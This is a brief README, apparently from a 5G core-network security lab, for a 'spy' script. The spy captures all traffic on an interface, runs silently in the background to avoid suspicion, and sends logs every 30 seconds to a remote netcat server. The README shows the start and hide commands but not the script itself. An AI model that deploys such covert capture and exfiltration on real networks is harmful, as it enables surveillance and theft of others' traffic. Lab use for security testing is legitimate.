# Start a Spy!

This spy saves all traffic on an interface and forwards every 30 seconds the log to a spy server elsewher. The output is supressed adn the porccess is run in the background to keep suspicion at bay.

Keep in mind that at the [spy server location an nc server](../../../../UE_VM/Exploit_Scripts/Spy) needs to be running with the correct port to recieve the logs. (The spy server can be a ue ;) )

To call the spy:
```console
user@Core:~/5G/CORE_VM/Config_Files/Vulnerability_Configs/Spy$ ./call_spy.sh -i <interface to log>, -s <spy server ip>, -p <spy server port>
```
End/hide the spy:
```console
user@Core:~/5G/CORE_VM/Config_Files/Vulnerability_Configs/Spy$ ./hide_spy.sh
```
